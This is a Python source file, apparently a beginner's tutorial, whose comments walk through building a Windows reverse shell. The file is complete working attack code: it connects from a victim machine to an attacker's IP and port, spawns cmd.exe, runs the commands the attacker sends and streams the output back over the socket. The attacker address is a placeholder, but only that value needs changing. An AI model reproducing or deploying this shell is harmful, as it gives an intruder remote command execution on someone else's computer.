# We have a lot of different tools we can use inside of python

# Firstly, we need something that can make connections:
import socket

# Second, we need to interact with the computer:
import os

# Third, we need something to run the commands, like cmd or powershell, we do this by creating this process with:
import subprocess

# Lastly, we can handle doing everything at once, so we need something to run these by themselves:
import threading

# Its important to note, that in programming, everything needs to be defined before we attempt to use it.
# We will basically build from the top down instead of up.

# The last thing we will want is to send the ouput of the command back to the attacker
# We want to do this constantly, everytime there is an ouput basically

# We will create a function the thread can target
def send_output(cmd, attacker):

    # We want to do this continuously, so lets set a while loop
    while True:

        # We want to read the output
        output = os.read(cmd.stdout.fileno(), 1024)
        # Then send it back to the attacker
        attacker.send(output)

# The what we do before this is to receive the data from the attacker, and run it as a command

# Create a function the thread can target
def receive_and_execute_attackers_command(cmd, attacker):

    # Do this continuously
    while True:

        # Receive data
        command_to_run = attacker.recv(1024)
        # Run the command
        os.write(cmd.stdin.fileno(), command_to_run)

# Now we can run everything in order
def main():
    
    # Establish attacker
    attackers_ip = "127.0.0.1"
    attackers_port = 4444

    # Begin connection from victim to attacker
    victim = socket.socket()
    victim.connect((attackers_ip, attackers_port))

    # Start a cmd.exe the attacker will use
    cmd = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    #                  ^ Open ^ cmd       ^ input will be passed  ^ output will be passed  ^ errors will be passed

    # Start receiving data
    receiving_input = threading.Thread(target=receive_and_execute_attackers_command, args=(cmd, victim))
    receiving_input.start()

    # Start sending output
    sending_output = threading.Thread(target=send_output, args=(cmd, victim), daemon=True)
    sending_output.start() 

# Start the script
if __name__ == "__main__":
    main()
